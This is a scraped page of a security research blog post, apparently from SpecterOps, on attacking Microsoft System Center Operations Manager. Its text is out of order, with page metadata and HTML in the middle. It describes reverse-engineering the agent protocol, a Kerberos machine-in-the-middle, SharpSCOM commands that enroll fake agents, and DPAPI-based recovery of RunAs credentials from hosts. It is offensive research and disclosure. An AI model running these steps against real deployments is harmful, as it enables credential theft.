C:\\Users\\domainadmin\u003ePsExec64.exe -i -s cmd.exe PsExec v2.43 - Execute processes remotely Copyright (C) 2001-2023 Mark Russinovich Sysinternals - www.sysinternals.com C:\\Windows\\system32\u003ewhoami nt authority\\system Inside our new SYSTEM shell, we run our Kerberos SSPI server.\nC:\\Users\\DA\u003eC:\\Users\\DA\\mydemoserver\\bin\\Release\\mydemoserver.exe Running as NT Authority\\SYSTEM Server listening on port 5000... Next we re-install the SCOM agent (we can’t change the server port once the agent is installed) and point it at our SSPI server on port 5000/TCP.\nAfter the agent installs, the agent will perform Kerberos authentication against our host over port 5000/TCP. Once authentication succeeds, the agent will encrypt its initial request data and send it inside a Kerberos wrap token. On the server side, we can then decrypt the wrap token and print the contents to the console.\nC:\\Users\\DA\\mydemoserver\\bin\\Release\\mydemoserver.exe Server authority: Server context user: LUDUS.DOMAIN\\WIN-SERVER$ DEBUG MESSAGE 1 (AP-REQ): 60-82-06-F6-06-09-2A-86-48-86-F7-12-01-02-02-01-00-6E-82-06-E5-30-82-06-E1-\u003cTRIMMED_FOR_BREVITY\u003e size: 1786 SERVER DEBUG MESSAGE 3 (decrypted kerb wrap token) HEX: 03-20-73-19-04-20-04-20-8C-00-00-00-5D-00-00-00-78-9C-9B-E7-AA-C2-C1-C8-C0-C0-50-03-C4-CC-40-EC-E4-EB-EF-CB-0E-14-58-DF-EB-55-93-7C-A0-5E-CA-42-42-90-FD-CE-B3-85-1C-11-6C-9A-0C-47-E5-37-0B-0B-FF-34-09-BD-D4-7F-B1-C5-13-A8-8E-93-01-04-D8-18-E4-53-18-18-D0-E5-19-D0-40-C1-94-DB-20-6B-18-4A-B8-20-7C-01-20-FE-8F-06-00-61-34-2A-6E This reveals to us the decrypted contents of the first message the agent sent to the SCOM server. At first glance, this doesn’t appear to be any more legible than the encrypted messages captured earlier; however, if we analyze the message structure, we identify two header bytes (78 9C) which indicate zlib compressed data.\nAfter decompression of the zlib data, we are presented with the below.\n00000000 9e 45 24 08 01 00 00 00 7c 00 00 00 03 00 00 00 |.E$.....|.......| 00000010 42 4d 4f 4d 07 01 00 00 31 64 9d 94 58 5b 6a a4 |BMOM....1d..X[j.| 00000020 83 ff b4 82 50 60 e7 07 80 8c 0b 1c 1f b2 2a 45 |....P`........*E| 00000030 19 77 6e a1 ed 46 c3 9c 49 4d 4f 4d 09 00 00 00 |.wn..F..IMOM....| 00000040 00 00 06 00 1f 64 00 00 80 8c 0b 1c 1f b2 2a 45 |.....d........*E| 00000050 19 77 6e a1 ed 46 c3 9c 00 00 00 00 00 00 00 00 |.wn..F..........| 00000060 00 00 00 00 00 00 00 00 ba 4f dc 01 00 00 00 00 |.........O......| 00000070 01 00 00 00 00 00 00 00 10 00 00 00 ff ff ff ff |................| 00000080 ff ff ff ff ff ff ff ff ff ff ff ff |............| 0000008c At this stage, we were really hoping for this to just be plain XML data. Instead, we discovered a proprietary network protocol SCOM used to handle agent communications. To create our client, we needed to roll up our sleeves and dive even deeper.\nSCOM Header Data Structure By reinstalling the agent and decrypting the initial message the server received each time, we started to observe certain patterns within the message data.\nPrepended to each message, we saw a consistent header structure outlined below. After reinstalling the agent several times on different machines and configurations, we were able to identify a set of constant values and fields related to the size of each section.\nManagement Group Name Inside the message, we observed two 16-byte values which appeared to change when we installed the agent on a different host or used a different management group name.\nLuckily for us, the SCOM server logs highly verbose entries inside the Windows event logs. Shortly after enrolling our agent, we saw the below entry.\nThis revealed that the first GUID 949d6431-5b58-a46a-83ff-b4825060e707 mapped to the Management Group Name while the second 1c0b8c80-b21f-452a-1977-6ea1ed46c39c belonged to the Entity (Agent) ID.\nTo determine the origin of these two GUIDs, we searched through the decompiled the .NET server side binaries searching for references to GUID instantiation. This resulted in the discovery of the GetGuidFromString method of the IdUtil Class inside of the C:\\Program Files\\Microsoft System Center\\Operations Manager\\Server\\CAManaged.dll DLL.\npublic static Guid GetGuidFromString(string textToHash) { SHA1 sha; if (!IdUtil.isFipsEnforcementEnabled) { try { sha = new SHA1Managed(); goto IL_24; } catch (InvalidOperationException) { IdUtil.isFipsEnforcementEnabled = true; sha = new SHA1CryptoServiceProvider(); goto IL_24; } } sha = new SHA1CryptoServiceProvider(); IL_24: byte[] array2; using (sha) { UnicodeEncoding unicodeEncoding = new UnicodeEncoding(); byte[] array; if (textToHash == null) { array = unicodeEncoding.GetBytes(\"\".ToString()); } else { array = unicodeEncoding.GetBytes(textToHash.ToString()); } array2 = sha.ComputeHash(array); } return new Guid(((int)array2[3] \u003c\u003c 24) | ((int)array2[2] \u003c\u003c 16) | ((int)array2[1] \u003c\u003c 8) | (int)array2[0], (short)(((int)array2[5] \u003c\u003c 8) | (int)array2[4]), (short)(((int)array2[7] \u003c\u003c 8) | (int)array2[6]), array2[8], array2[9], array2[10], array2[11], array2[12], array2[13], array2[14], array2[15]); } Here the management server name is run through a SHA1 hash function with the resulting bytes being converted to GUID representation. We then ran our SCOM management server name SCOM1 through this function and confirmed the resulting GUID matched the one we saw in the event logs.\nPS C:\\Users\\matth\\Downloads\u003e .\\ConsoleApp1.exe SCOM1 [+] Generating GUID from input string: SCOM1 (949d6431-5b58-a46a-83ff-b4825060e707) Unfortunately, this did not appear to be the same algorithm used for generating the agent ID.\nPS C:\\Users\\matth\\Downloads\u003e .\\ConsoleApp1.exe scom-db.ludus.domain [+] Generating GUID from input string: scom-db.ludus.domain (4d97e519-9b84-aa13-78bb-a1e6975db6de) Agent ID Searching further through the IdUtil Class we saw a reference to a native DLL HealthServiceRuntime.dll with a single exported function GetLocalHealthServiceId.\nprivate static class NativeMethods { [DllImport(\"HealthServiceRuntime.dll\", CallingConvention = CallingConvention.StdCall, ExactSpelling = true)] public static extern uint GetLocalHealthServiceId(out Guid localHealthServiceId); } Referencing this DLL and calling this function locally on a machine with the SCOM agent installed, we saw this returned a GUID matching the EntityID value found in the event logs.\nPS C:\\Users\\matth\\Downloads\u003e .\\ConsoleApp2.exe [+] Calling GetLocalHealthServiceId() 1c0b8c80-b21f-452a-1977-6ea1ed46c39c To identify how this second GUID was generated, we attached a debugger to our process and set a breakpoint on the entry of the GetLocalHealthServiceId function. Stepping through this function, we saw that a call to GetComputerNameExA was made suggesting that the hostname was likely used to generate the unique agent GUID.\nTo confirm this, we set a breakpoint before the call to GetComputerNameExA and manually patched the first byte of our hostname to a different value before stepping over the function call.\nThis resulted in a different GUID value being returned, confirming that the hostname was indeed being used as an input to generate the GUID.\nTo identity exactly how this GUID generated, we loaded the healthserviceruntime.dll DLL into IDA to perform static analysis alongside our dynamic analysis inside of x64dbg.\nNote: Some function names in the below output have been manually renamed inside of IDA\nInside of the IDA decompiler view, we located the pseudocode for the exported function GetLocalHealthServiceId and saw a call made to subroutine sub_7FFE197F1A90.\nThis ultimately resulted in a call to sub_7FFE3A471EC0 which captured the computer name via GetComputerNameExA as observed in the debugger.\nAfter returning the local computer name, a call to subroutine sub_7FFE197F10F0 is made passing in two static GUIDs AB4C891F-3359-3FB6-0704-075FBFE36710 and 5C324096-D928-76DB-E9E7-E629DCC261B1 stored within the healthserviceruntime.dll itself.\nThese two GUIDs are concatenated into a string with format \"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=\" and passed to another function sub_7FFE3A470EA0 along with the returned local computer name (converted to upper case).\nThis, in turn, calls sub_7FFAD5DE0F60 with a final concatenated string containing the two GUIDs and the computer name \"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG\".\nBreaking on this function in the debugger, we can see this final string passed as the first argument to sub_7FFAD5DE0F60 with the second argument being used to store the output of this function.\nStepping over this function we indeed see that this returns the expected agent GUID.\nInside of sub_7FFAD5DE0F60 we note one final function call tosub_7FFE3A4725E0 before our generated GUID value returned.\nExamining the decompiler view in IDA for function sub_7FFE3A4725E0, we see that a hash value is created from our input string via call to CryptGetHashParam.\nAt this stage, we speculated that this could be the same algorithm used to create a GUID from a SHA1 hash as seen in the decompiled C# code. To verify this, we ran the GetGuidFromString C# function providing the concatenated string as input.\nPS C:\\Users\\matth\\Downloads\u003e .\\ConsoleApp1.exe \"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG\" And confirmed that the output matched the data returned from the native DLL.\n[+] Generating GUID from input string: \"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG\" (4d97e519-9b84-aa13-78bb-a1e6975db6de) Agent Timestamp With knowledge of how both of the GUIDs contained in the SCOM message were generated, we moved onto the remaining unknown values. This included a value observed in each message agent_nonce where the low byte values appeared to shift while the high bytes remained static.\nThis behaviour hinted to us that it could be some sort of time stamp. To identify the source of this value, we needed to locate the code responsible for constructing the MOM header struct. By searching for the delimiter values observed in the MOM header section IMOM and BMOM across all of the agent DLLs we observe a single hit.\nmattjohnson@mattjohnsons-MacBook-Pro Agent % grep . -rnwi -e \"BMOM\" Binary file ./MOMConnector.dll matches Loading this DLL into IDA and searching for references to IMOM and BMOM, we locate a few potential candidate functions.\nInside function sub_1800450A0 we see the ASCII string IMOM being referenced inside of what we suspect is our MOM header structure.\nAs we had already documented this structure, we could reuse this structure definition inside of IDA’s Local Types view to aid with our analysis.\nApplying this structure definition resulted in the below.\nAfter our structure was parsed, we saw a reference to our currently unknown value agent_nonce inside of function sub_1800450A0.\nHere we see that this value is seeded via a call to GetSystemTimeAsFileTime. The high bytes from this timestamp were then used to create the value the agent sent. Implementing this in C# was straightforward using the below.\nlong fileTime64 = DateTime.UtcNow.ToFileTimeUtc(); uint dwHighDateTime = (uint)(fileTime64 \u003e\u003e 32); byte[] fileTimeBytes = new byte[4]; fileTimeBytes[0] = (byte)(dwHighDateTime \u0026 0xFF); fileTimeBytes[1] = (byte)((dwHighDateTime \u003e\u003e 8) \u0026 0xFF); fileTimeBytes[2] = (byte)((dwHighDateTime \u003e\u003e 16) \u0026 0xFF); fileTimeBytes[3] = (byte)((dwHighDateTime \u003e\u003e 24) \u0026 0xFF); Writing a SCOM MiTM With the fields for the SCOM headers documented, we could begin analyzing the message body for each message sent by the agent during enrollment. In order to capture more than just the first message the agent sent, we needed to extend our code beyond a simple server and into a complete machine-in-the-middle (MitM) attack.\nTo impersonate the connecting client, we needed to send the received message over a local named pipe to another process running in the security context of the authenticating client. The below diagram illustrates the setup and the required security contexts for each step in the chain.\nAfter setting up our MiTM, we installed the SCOM agent on a freshly deployed VM and captured the below requests coming in.\n[+] SCOM MiTM running in server mode. Listening on port 5000 using pipename scompipe [SERVER]: Server authority: [SERVER]: Server context user: INITECH\\SERVER-2019$ [SERVER]: Server session key: A0-55-E5-0E-D9-A4-7C-6A-AA-8E-32-1A-45-4A-06-0A-AD-DE-3D-4D-87-05-B3-8D-6C-09-6B-36-10-0E-19-11 [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [DECRYPT] plaintext wrap token (base64): AyBzGQQgBCCMAAAAXQAAAHicm+eqwsHIwMBQA8TMQOzk6+/LDhRY3+tVk3ygXspCQpD9zrOFHPZn2V9sW3/Re3PzuamaE0JYPYHqOBlAgI1BPoWBAV2eAQ0oz7wNsoaBEcoXAOL/aAAAaq4s/w== [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [DECRYPT] zlib decompressed wrap token (base64): nkUkCAEAAAB8AAAAAwAAAEJNT00HAQAAr41KfGPAfxo4GBEH3OahCD/NB+i2r9FLs4POlSmQVAVJTU9NCQAAAAAABgAfZAAAP80H6Lav0Uuzg86VKZBUBQAAAAAAAAAAAAAAAAAAAAAjmdsBAAAAAAEAAAAAAAAAEAAAAP////////////////////8= [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] sending agent data to pipe... [AGENT \u003c\u003c\u003c\u003c\u003c\u003c\u003c SCOM] waiting for server response from pipe... [AGENT \u003c\u003c\u003c\u003c\u003c\u003c\u003c SCOM] got data from pipe. Sending to agent... [AGENT \u003c\u003c\u003c\u003c\u003c\u003c\u003c SCOM] [ENCRYPT] plaintext wrap token data (base64): AyBzGQQgBCAEAQAAiAAAAHicm+eqwsHIwMDxhYGBgRmInXz9fdmBAut7vWqSD9RLWUgIst95tpCja1qZUFf4PLsbEQYbTy9/5OwJVMfJAAJMDOIpDAwV3Bbcj6ZlvO/c1VAgUD9vk/1Z9hfb1l/03tx8bqrmhBBW5Zm3GUGq7/5igANSzVCBmvGWAjNUoWb8RjIDAA1pUPE= [AGENT \u003c\u003c\u003c\u003c\u003c\u003c\u003c SCOM] [ENCRYPT] zlib decompressed wrap token (base64): nkUkCAEAAAj0AAAAAwAAAEJNT00HAQAAr41KfGPAfxo4GBEH3OahCIqWdhKKV54+2Fgwscun4kNJTU9NCQAAAAAAAgAXZAAAeAs4C+KWaO+JuoBwEH+esj/NB+i2r9FLs4POlSmQVAUjmdsBAAAAAN36AAAAAAAAAAAAAElNT00JAAAAAAACABdkAAB4CzgL4pZo74m6gHAQf56yP80H6Lav0Uuzg86VKZBUBSSZ2wEAAAAA7foAAAAAAAAAAAAASU1PTQkAAAAAAAIAF2QAAHgLOAvilmjvibqAcBB/nrI/zQfotq/RS7ODzpUpkFQFJZnbAQAAAAD7+gAAAAAAAAAAAAA= [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [DECRYPT] plaintext wrap token (base64): AyBzGQQgBCByBQAALgQAAHicm+eqwsHEwMCQxMrAwAyknXz9fdkZGR\u003cTRIMMED FOR BREVITY\u003e [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [DECRYPT] zlib decompressed wrap token (base64): nkUkCAIAAABiBQAAAwAAAEJNT00HAQA\u003cTRIMMED FOR BREVITY\u003e Analysis of Enrollment Messages After capturing each message the agent sent during enrollment, we identified a total of four messages sent to the server prior to the policy data returning. Going forward, we will refer to them as the following:\nAgent registration message (MSG 1) Certificate registration message (MSG 2) Policy request message (MSG 3) Policy download message (MSG 4) The below high level diagram illustrates the message exchange that both the agent and server performed during enrollment.\nNote: To add further complexity to the mix, SCOM also supports multi-part messages where any of the above four messages can be combined and sent as a single request. For clarity, we will treat each message individually in this write-up but note that the SCOM agent will often send them together.\nAgent Registration Message (MSG 1) This is the first message in the exchange used to register the agent with the SCOM management server. This message includes the SCOM header values we previously documented along with a series of bytes which identify the message (labeled as Command) and any arguments provided (labeled as Payload).\nTo test our assumptions, we added functionality to SharpSCOM to connect over port 5723/TCP and send individual messages as binary data.\nSharpSCOM.exe RegisterAgent /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain █▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█ ▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █ Author: Matt Johnson - SpecterOps - v0.0.1 [+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54) [+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad) [+] Server: scom-om1.ludus.domain:5723 [+] Preparing to send single agent message... [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [ENCRYPT] plaintext wrap token (base64): AyBzGQQgBCCMAAAAXQAAAHicm+eqwsHIwMBQA8TMQOzk6+/LDhQwTJk7JSI6a0nz/y1NAQnP2V9mh3uw7jh3mNUy2nDjLodpnkB1nAwgwMYgn8LAgC7PgAbYbe6ArGFghPIFgPg/GgAAVlAsHQ== [AGENT \u003e\u003e\u003e\u003e\u003e\u003e SCOM] [ENCRYPT] zlib decompressed wrap token (base64): nkUkCAEAAAB8AAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB+lrV0gFuM7DBTlbMbG6QJZJTU9NCQAAAAAABgAfZAAA6WtXSAW4zsMFOVsxsbpAlgAAAAAAAAAAAAAAAAAAAAAHPNwBAAAAAAEAAAAAAAAAEAAAAP////////////////////8= After sending the message, the below entry can be seen in the SCOM server event logs indicating our agent successfully registered.\nAgent Certificate Registration Message (MSG 2) After the agent successfully registered, a new public / private key pair and corresponding certificate is generated. The certificate is saved locally inside the Microsoft Monitoring Agent store while the certificate and associated public key are sent to the server inside the Payload field of the message.\nOnce the SCOM server receives the public key, it is saved in the database and used to encrypt the SecureData section of the agent policy file. To replicate the structure of the certificate sent in the request, we need to locate the function responsible for generating the agent self signed certificate.\nLoading the HealthService.dll into IDA, we see a number of certificate related functions are present in the imports table.\nSearching for references to the CertCreateSelfSignCertificate function, we find a function at sub_1801DF520 which constructs the relevant fields for the self signed certificate.\nInside sub_1801DF520 we see the variables and flags which are provided to the CertCreateSelfSignCertificate function to generate the self signed certificate.\nThe generated certificate is then serialized with a call to to CertSerializeCertificateStoreElement before being stored in the Local Certificate store inside the Microsoft Monitoring Agent container.\nBy replicating this code in C# via pinvoke, we can generate our own self signed certificate. We then added a function to SharpSCOM to generate a new certificate, serialize the data, and send it to the server.\nSharpSCOM.exe RegisterCertificate /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain █▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█ ▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █ Author: Matt Johnson - SpecterOps - v0.0.1 [+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54) [+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad) [+] Server: scom-om1.ludus.domain:5723 [+] Preparing to send single agent message... [+] Generating new agent certificate for fake1.ludus.domain [+] Subject: CN=fake1.ludus.domain, OU=RunAs Account Encryption, O=Microsoft [+] Serial Number: 4718FEBFD26B45A24405206C262C1F66 [+] Valid From: 10/26/2025 2:32:48 AM UTC [+] Valid To: 10/26/2026 2:32:48 AM UTC [+] Thumbprint: 7AA2A863985A965AA7E42061F5D344D17B68DB23 [+] Public Key (Hex): ","wordCount":"9040","inLanguage":"en","image":"https://breakfix.co/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-12-27T07:58:57+11:00","dateModified":"2025-12-27T07:58:57+11:00","author":{"@type":"Person","name":"Matt Johnson"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://breakfix.co/posts/scommand-and-conquer---attacking-system-center-operations-manager/"},"publisher":{"@type":"Organization","name":" ","logo":{"@type":"ImageObject","url":"https://breakfix.co/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://breakfix.co/ accesskey=h title="  (Alt + H)"><img src=https://breakfix.co/logo/logo.svg alt aria-label=logo height=50></a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://breakfix.co/contact/ title=Contact><span>Contact</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://breakfix.co/>Home</a>&nbsp;»&nbsp;<a href=https://breakfix.co/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">SCOMmand And Conquer - Attacking System Center Operations Manager</h1><div class=post-meta><span title='2025-12-27 07:58:57 +1100 AEDT'>December 27, 2025</span>&nbsp;·&nbsp;<span>43 min</span>&nbsp;·&nbsp;<span>9040 words</span>&nbsp;·&nbsp;<span>Matt Johnson</span></div></header><div class=post-content><h3 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h3><p>With many enterprise management solutions, a key weakness lies in securing credential material sent to endpoints. As the endpoint requires access to the cleartext credentials in order to use them, attackers can leverage this same process to gain access also.</p><p>Additionally, there is often an implicit trust granted to enrolled devices. If we can enroll our own device, we can potentially access sensitive data that would otherwise be unavailable. Such attacks already exist in other management products (such as <a href=https://github.com/subat0mik/Misconfiguration-Manager/blob/b23b3130ff1050519965f1bed54b577ab12eaec2/attack-techniques/CRED/CRED-2/cred-2_description.md>SCCM</a> and <a href=https://www.mdsec.co.uk/2024/12/extracting-account-connectivity-credentials-accs-from-symantec-management-agent-aka-altiris/>Symantec Management Agent</a>)).</p><p>If we could leverage a similar attack to enroll an arbitrary agent with SCOM, we could potentially access agent policy data and any sensitive data stored within it. Hence, we set forth to understand the SCOM agent enrollment process, how authentication was performed, and how credentials were distributed to agents.</p><p>We found that credentials could be obtained using this technique in certain configurations and wrote a tool to help automate their recovery. To skip straight to the tool, go here <a href=https://github.com/SpecterOps/SharpSCOM>https://github.com/breakfix/SharpSCOM</a></p><h3 id=runas-credentials-overview>RunAs Credentials Overview<a hidden class=anchor aria-hidden=true href=#runas-credentials-overview>#</a></h3><p>Before diving into the SCOM agent protocol itself, here is a quick summary of why we as attackers might be interested in focusing our attention on it in the first place.</p><p>In order to extend the monitoring capabilities of SCOM, additional credentials (referred to as RunAs credentials) can be added to be used with specific monitoring tasks. This is especially useful when authenticating to an external service to retrieve monitoring data — for example, an MSSQL database that requires database-level authentication via a <code>sa</code> account.</p><p>These RunAs credentials are stored in the SCOM management server database as well as directly on any hosts which they have been distributed to.</p><blockquote><p><strong>Note</strong>: Some excellent existing research by Rich Warren of NCC group has been done into extraction of RunAs credentials stored in the SCOM database <a href=https://www.nccgroup.com/research-blog/scomplicated-decrypting-scom-runas-credentials/>here</a> along with a <a href=https://github.com/nccgroup/SCOMDecrypt>tool</a> for decryption. Rich&rsquo;s research focuses on extracting credentials from a compromised SCOM database server. The focus of this blog post is on RunAs credential recovery from managed hosts themselves.</p></blockquote><p>RunAs credentials are associated with a RunAs Profile which defines how and where the credentials are distributed. When creating a new RunAs credential, administrators are presented with two options, <code>More Secure</code> and <code>Less Secure</code>.</p><figure><img loading=lazy src=/scom/image.png width=700></figure><p>Based on the names of each option, it should be clear which option provides the best security. When selecting the <code>Less secure</code> option, the RunAs credential distributes to all enrolled devices. Conversely, <code>More secure</code> will only distribute RunAs credentials to specific hosts or groups we specify, limiting their exposure. Despite this, RunAs credentials may be configured with the <code>Less secure</code> option to reduce administrative overhead.</p><p>When these credentials are distributed to an enrolled agent, the required RunAs credentials are retrieved from the SCOM management database, encrypted with the agent&rsquo;s public key, and sent back to agent in the policy configuration file. The below high-level diagram illustrates the distribution of RunAs credentials to an enrolled agent.</p><p><img alt="Untitled Diagram-Page-19.drawio (10).png" loading=lazy src=/scom/Untitled_Diagram-Page-19.drawio_(10).png></p><p>With an understanding on how these credentials are sent to the agent, we looked to see what options were available to us for recovery of these credentials.</p><h3 id=runas-credential-recovery-on-host>RunAs Credential Recovery On-Host<a hidden class=anchor aria-hidden=true href=#runas-credential-recovery-on-host>#</a></h3><h3 id=recovery-via-registry>Recovery via Registry<a hidden class=anchor aria-hidden=true href=#recovery-via-registry>#</a></h3><p>In the event we manage to compromise a server which is already enrolled in SCOM, we can attempt to decrypt any RunAs credentials stored on the machine directly. If RunAs credentials are in use and have been distributed to the agent, they will be stored in the registry at the below location <code>HKLM\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\$MANAGEMENT_GROUP$\SSDB\SSIDs\*</code>.</p><p><img alt=image.png loading=lazy src=/scom/image%201.png></p><p>Observing the header bytes of these registry entires <code>01 00 00 00 D0 8C 9D</code> suggested that our good friend DPAPI was likely at play here. Passing the binary value to SharpDPAPI confirmed this by parsing the structure and showing the master key GUID needed for decryption.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>da</span><span class=err>\</span><span class=nx>Downloads</span><span class=o>&gt;</span><span class=nx>SharpDPAPI</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>blob</span> <span class=o>/</span><span class=nx>target</span><span class=o>:</span><span class=p>&lt;</span><span class=nt>TRIMMED_FOR_BREVITY</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>__</span>                 <span class=nx>_</span>   <span class=nx>_</span>       <span class=nx>_</span> <span class=nx>___</span>
</span></span><span class=line><span class=cl> <span class=p>(</span><span class=nx>_</span>  <span class=o>|</span><span class=nx>_</span>   <span class=nx>_</span><span class=p>.</span> <span class=p>.</span><span class=nx>_</span> <span class=p>.</span><span class=nx>_</span>  <span class=o>|</span> <span class=err>\</span> <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>/</span><span class=err>\</span>  <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>|</span>
</span></span><span class=line><span class=cl> <span class=nx>__</span><span class=p>)</span> <span class=o>|</span> <span class=o>|</span> <span class=p>(</span><span class=nx>_</span><span class=o>|</span> <span class=o>|</span>  <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>|</span><span class=nx>_</span><span class=o>/</span> <span class=o>|</span>  <span class=err>/--\ |  _|_</span>
</span></span><span class=line><span class=cl>                <span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=nx>v1</span><span class=mf>.11.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Action</span><span class=o>:</span> <span class=nx>Describe</span> <span class=nx>DPAPI</span> <span class=nx>blob</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>guidMasterKey</span>    <span class=o>:</span> <span class=p>{</span><span class=mi>90226</span><span class=nx>a7d</span><span class=o>-</span><span class=mi>5440</span><span class=o>-</span><span class=mi>4498</span><span class=o>-</span><span class=mi>8631</span><span class=o>-</span><span class=mi>8</span><span class=nx>b8f39292ebc</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>size</span>             <span class=o>:</span> <span class=mi>1318</span>
</span></span><span class=line><span class=cl>    <span class=nx>flags</span>            <span class=o>:</span> <span class=mh>0x14</span>
</span></span><span class=line><span class=cl>    <span class=nx>algHash</span><span class=o>/</span><span class=nx>algCrypt</span> <span class=o>:</span> <span class=mi>32782</span> <span class=p>(</span><span class=nx>CALG_SHA_512</span><span class=p>)</span> <span class=o>/</span> <span class=mi>26128</span> <span class=p>(</span><span class=nx>CALG_AES_256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>description</span>      <span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=nx>X</span><span class=p>]</span> <span class=nx>MasterKey</span> <span class=nx>GUID</span> <span class=nx>not</span> <span class=k>in</span> <span class=nx>cache</span><span class=o>:</span> <span class=p>{</span><span class=mi>90226</span><span class=nx>a7d</span><span class=o>-</span><span class=mi>5440</span><span class=o>-</span><span class=mi>4498</span><span class=o>-</span><span class=mi>8631</span><span class=o>-</span><span class=mi>8</span><span class=nx>b8f39292ebc</span><span class=p>}</span>
</span></span></code></pre></div><p>However, our attempts to decrypt these blobs by providing the <code>GUID:SHA1</code> values required did not result in credentials as expected.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>da</span><span class=err>\</span><span class=nx>Downloads</span><span class=o>&gt;</span><span class=nx>SharpDPAPI</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>blob</span> <span class=o>/</span><span class=nx>target</span><span class=o>:</span><span class=p>&lt;</span><span class=nt>TRIMMED_FOR_BREVITY</span><span class=p>&gt;</span> <span class=p>{</span><span class=mi>90226</span><span class=nx>a7d</span><span class=o>-</span><span class=mi>5440</span><span class=o>-</span><span class=mi>4498</span><span class=o>-</span><span class=mi>8631</span><span class=o>-</span><span class=mi>8</span><span class=nx>b8f39292ebc</span><span class=p>}</span><span class=o>:</span><span class=nx>EEF09F0F62C03E67D419A21812253B9F8D4B9257</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>__</span>                 <span class=nx>_</span>   <span class=nx>_</span>       <span class=nx>_</span> <span class=nx>___</span>
</span></span><span class=line><span class=cl> <span class=p>(</span><span class=nx>_</span>  <span class=o>|</span><span class=nx>_</span>   <span class=nx>_</span><span class=p>.</span> <span class=p>.</span><span class=nx>_</span> <span class=p>.</span><span class=nx>_</span>  <span class=o>|</span> <span class=err>\</span> <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>/</span><span class=err>\</span>  <span class=o>|</span><span class=nx>_</span><span class=p>)</span> <span class=o>|</span>
